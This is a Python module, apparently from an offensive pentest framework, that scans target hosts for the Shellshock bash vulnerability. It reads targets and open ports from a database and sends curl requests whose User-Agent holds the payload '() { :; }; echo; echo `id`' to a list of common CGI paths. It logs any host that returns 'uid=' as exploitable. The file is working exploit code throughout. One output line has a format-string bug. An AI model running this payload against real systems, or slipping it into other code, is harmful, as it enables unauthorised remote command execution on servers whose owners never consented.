# http://blog.knownsec.com/2014/10/shellshock_response_profile_v4/#more-1559
# bash rce
import re
import sys
from exp10it import get_target_urls_from_db
from exp10it import execute_sql_in_db
from urllib.parse import urlparse
from exp10it import get_string_from_command
from exp10it import CLIOutput
from exp10it import figlet2file
from exp10it import get_target_table_name_list
from exp10it import commonNotWebPortList
modulePath = __file__[:-len(__file__.split("/")[-1])]

cgiList = [
    "/cgi-bin/load.cgi",
    "/cgi-bin/gsweb.cgi",
    "/cgi-bin/redirector.cgi",
    "/cgi-bin/test.cgi",
    "/cgi-bin/index.cgi",
    "/cgi-bin/help.cgi",
    "/cgi-bin/about.cgi",
    "/cgi-bin/vidredirect.cgi",
    "/cgi-bin/click.cgi",
    "/cgi-bin/details.cgi",
    "/cgi-bin/log.cgi",
    "/cgi-bin/viewcontent.cgi",
    "/cgi-bin/content.cgi",
    "/cgi-bin/admin.cgi",
    "/cgi-bin/webmail.cgi",
]

target = sys.argv[1]
urls = get_target_urls_from_db(target, "exp10itdb")
for eachUrl in urls:
    if "^" in eachUrl:
        eachUrl = eachUrl.split("^")[0]
    parsed = urlparse(eachUrl)
    url = parsed.scheme + "://" + parsed.netloc + parsed.path
    if re.search(r"\.cgi$", url, re.I):
        a = get_string_from_command("curl '%s' -A '() { :; }; echo; echo `id`' -k" % url)
        if re.search(r"uid=", a, re.I):
            string_to_write = "Congratulations! shellshock vul exists on %s\n%s" % url
            CLIOutput().good_print(string_to_write)
            with open("%sresult.txt" %
                      modulePath, "a+") as f:
                f.write(string_to_write)


target = sys.argv[1]
if target[:4] == "http":
    target = urlparse(target).hostname
figlet2file("test shellshock vul for %s" % target, 0, True)
target_table_name = get_target_table_name_list(target)[0]
result = execute_sql_in_db("select port_scan_info from %s where http_domain='%s'" %
                           (target_table_name, target), "exp10itdb")
if len(result) > 0:
    nmap_result_string = result[0][0]
    a = re.findall(r"(\d+)/(tcp)|(udp)\s+open", nmap_result_string, re.I)
    openPortList = []
    for each in a:
        if each[0] not in openPortList and each[0] not in commonNotWebPortList:
            openPortList.append(each[0])
    for eachPort in openPortList:
        for eachCgi in cgiList:
            a = get_string_from_command(
                "curl '%s' -A '() { :; }; echo; echo `id`' -k" % (target + ":" + eachPort + eachCgi))
            if re.search(r"uid=", a, re.I):
                string_to_write = "Congratulations! shellshock vul exists on %s\n%s" % (
                    target + ":" + eachPort + eachCgi, a)
                CLIOutput().good_print(string_to_write)
                with open("%sresult.txt" % modulePath, "a+") as f:
                    f.write(string_to_write)
else:
    print("coz I found no nmap scan result from database,I will not run shellshock vul check module")
